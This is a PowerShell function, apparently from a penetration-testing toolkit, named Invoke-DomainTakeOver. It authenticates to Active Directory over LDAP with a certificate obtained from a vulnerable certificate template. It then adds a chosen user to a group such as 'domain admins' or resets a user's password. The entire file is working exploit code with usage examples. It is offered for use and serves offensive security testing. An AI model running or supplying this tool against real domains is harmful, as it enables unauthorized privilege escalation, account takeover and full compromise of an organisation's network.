function Invoke-DomainTakeOver{
    <#
    .SYNOPSIS

        Execute LDAP query using a certificate created from a vulnerable template.

    .DESCRIPTION

        This cmdlet is used to exploit a certificate created from a vulnerable template with high privilege user as context and then execute an LDAP query to add a user to a group in the domain or change a user password.  

    .EXAMPLE

        PS c:\> Invoke-DomainTakeOver -Operation AddToGroup -UserName shimmi -Group "domain admins" -CertificateName cert

        Description
        -----------
        Add user to a given group.

    .EXAMPLE

        PS c:\> Invoke-DomainTakeOver -Operation ChangePassword -UserName shimmi -NewPassword Aa1234567! -CertificateName cert

        Description
        -----------
        Change the password of a given user.

    .PARAMETER Operation

        Defines the operation - password change\add to group to perform.

    .PARAMETER Machine

        Set if the script should be run using a certificate issued to local machine.
    
    .PARAMETER UserName

        Defines the user on which the operation - password change\add to group is performed.

    .PARAMETER NewPassword

        Defines the password we want to change the user's password to.

    .PARAMETER CertificateName

        Defines the certificate to use.
    
    .PARAMETER Group

        Defines the group to which the user will be added.

    .NOTES
        Author: Tamir Yehuda
        Alias: @Tamirye94
        Contact: tamir@white-hat.co.il
        cerdit: script idea came from article https://blog.qdsecurity.se/2020/09/04/supply-in-the-request-shenanigans/
    #>
    param(
        [Alias("op")]
        [Parameter(Mandatory = $true)]
        [ValidateSet('AddtoGroup', 'ChangePassword')]
        [String]
        $Operation="AddtoGroup",

        [Alias("m")]
        [Parameter(Mandatory = $false)]
        [ValidateSet('true', 'false')]
        [String]
        $Machine="false",

        [Alias("u")]
        [Parameter(Mandatory = $false)]
        [string] 
        $UserName=$env:UserName,

        [Alias("g")]
        [Parameter(Mandatory = $false)]
        [string] 
        $Group,

        [Alias("p")]
        [Parameter(Mandatory = $false)]
        [string] 
        $NewPassword,

        [Alias("c")]
        [Parameter(Mandatory = $true)]
        [string] 
        $CertificateName
    )

    Add-Type -AssemblyName System.DirectoryServices.Protocols
    Add-Type -AssemblyName System.Security

    $Id = New-Object -TypeName System.DirectoryServices.Protocols.LdapDirectoryIdentifier -ArgumentList '', 389, $true, $false
    $Ldap = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $Id, $null, ([System.DirectoryServices.Protocols.AuthType]::External)
    $Ldap.AutoBind = $false
    if($machine -eq "true"){
        write-host "[+] using machine certificate store!"
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
            $Location = [System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine
        } else {
            write-host "[!] You don't have local admin privileges on machine, trying to find the cert on user certificate store"
        }
    } else {
        $Location = [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser
    }
    $Name = [System.Security.Cryptography.X509Certificates.StoreName]::My
    $Store = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Store -ArgumentList $Name, $Location
    $Store.Open("ReadOnly, MaxAllowed, OpenExistingOnly")
    $Cert = $Store.Certificates.Find("FindBySubjectName", "$CertificateName", $true)
    $Store.Dispose()
    $Ldap.ClientCertificates.Clear()
    [void]$Ldap.ClientCertificates.Add($Cert[0])
    $Ldap.SessionOptions.QueryClientCertificate = {
        param(
            [System.DirectoryServices.Protocols.LdapConnection]
            $Connection
            , [Byte[][]]
            $TrustedCAs
        )
        return $Cert[0]
    }

    Write-Host "[+] Starting to exploit the vulnerable certificate"
    Write-Host "[+] Trying to establish a TLS Connection"
    $Ldap.SessionOptions.StartTransportLayerSecurity($null)
    
    $RootDseSearchRequest = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest -ArgumentList '', "(&(objectClass=*))", "Base"
    Try
    {
        $RootDseSearchResponse = $null
        $RootDseSearchResponse = $Ldap.SendRequest($RootDseSearchRequest)
    }
    Catch
    {
        $Ldap.Dispose()
        throw $_
    }
    "[+] Default naming context: {0}" -f $RootDseSearchResponse.Entries[0].Attributes["defaultNamingContext"].GetValues([String])
    
    write-host "[+] Binding"
    Try
    {
        $Ldap.Bind()
    }
    Catch
    {
        throw
    }
    
    # Send an Extended WHOAMI request
    $ExtReq = New-Object -TypeName System.DirectoryServices.Protocols.ExtendedRequest -ArgumentList "1.3.6.1.4.1.4203.1.11.3"
    $ExtRes = [System.DirectoryServices.Protocols.ExtendedResponse] $Ldap.SendRequest($ExtReq)
    "[+] Bound as identity: '{0}'" -f [System.Text.Encoding]::UTF8.GetString($ExtRes.ResponseValue)
    $UserScope = (New-Object DirectoryServices.DirectorySearcher ("SamAccountName=$UserName")).FindAll()
    $UserDN = ($UserScope.Properties["DistinguishedName"])[0]
    if($Operation -eq "AddtoGroup"){
        write-host "[+] Adding $UserName to $Group group!"
        $AddGroup = (New-Object DirectoryServices.DirectorySearcher ("CN=$Group")).FindAll()
        $AddGroupDN = ($AddGroup.Properties["DistinguishedName"])[0]
        $Modify = [System.DirectoryServices.Protocols.ModifyRequest]::new($AddGroupDN, "Add", "member", $UserDN)
    } elseif($Operation -eq "ChangePassword"){
        write-host "[+] Changing $UserName's password to $NewPassword"
        $Modify = [System.DirectoryServices.Protocols.ModifyRequest]::new($UserDN, "Replace", "userPassword", $NewPassword)
    }

    Try
    {
        $Response = $Ldap.SendRequest($Modify)
    }
    Catch
    {
        $Response = $_.Exception.GetBaseException().Response
    }
    "[+] Result: {0}" -f $Response.ResultCode
    $Ldap.Dispose()

}